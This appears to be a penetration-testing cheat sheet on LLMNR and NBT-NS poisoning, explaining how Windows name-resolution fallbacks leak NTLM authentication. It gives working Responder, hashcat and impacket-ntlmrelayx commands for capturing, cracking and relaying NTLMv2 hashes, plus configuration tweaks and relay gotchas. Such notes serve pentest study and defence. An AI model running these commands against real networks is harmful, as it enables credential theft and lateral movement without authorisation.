# LLMNR Poisoning

<img width="1280" height="720" alt="LLMNR_poisoning" src="https://github.com/user-attachments/assets/4ff68b8f-e09d-4f7d-8354-060db0471c7c" />

## LLMNR (Link-Local Multicast Name Resolution)

#### 5355 - UDP

Basically whenever DNS doesn't have an answer on how to resolve a domain - Windows PC screams throughout local network.

e.g.
> "Hey, I need 'printer 1', anyone knows where it is?" 

Logically speaking - we can try to answer first, so if we're lucky - Victims PC will communicate with us, thus sending its credentials (authentication response/NTLM challenge-response).

## NBT-NS (Net-Bios)

#### 137 - UDP

Yet again - no DNS - we start to scream what we're looking for, but instead of looking for something that's listening - we literally ask everything on the net

Same problem as with LLMNR, but it's an outdated protocol.

e.g.
> "Does anyone knows where 'printer 1' is?"

## May be combined with

- [WPAD Hijacking](WPAD%20hijacking.md) - (Force proxy auth over NTLM)
- SMB Relay      - (Relay captured NTLM auth to another SMB)
- NTLM Relay     - (Relay auth to SMB/HTTP/LDAP/MSQL/others...)
- IPv6/mitm6     - (Abuse IPv6 NameResolver to trigger NTLM auth)

## Commands

### Сapture & Сrack 
Responder does everything and then logs the NTLMv2 hash - Then you crack offline.
```bash
sudo responder -I wlan0 -wF
# hashes - /usr/share/responder/logs/
hashcat -m 5600 hash.txt rockyou.txt
```

### Relay
We don't really wanna Responder to handle, we wanna forward. 
So we mute Responder's listeners using ntlmrelayx listen.
```bash
# /etc/responder/Responder.conf
SMB  = Off      # free up 445 for ntlmrelayx
HTTP = Off      # free up 80  for ntlmrelayx
```
```bash
# Term1 - listening on ports
sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# Term2 - Poisoning
sudo responder -I wlan0 -dwF      # -d = inject WPAD via DHCP as well (tho much noise)
```

### Gotchas

- Host auth can't go back to itself (reflection died with MS08-068).
  targets.txt must point at different hosts.
- The target mustn't require SMB signing or relay dies.
- targets.txt - one per line: smb://10.0.0.5, ldap://dc01, ...
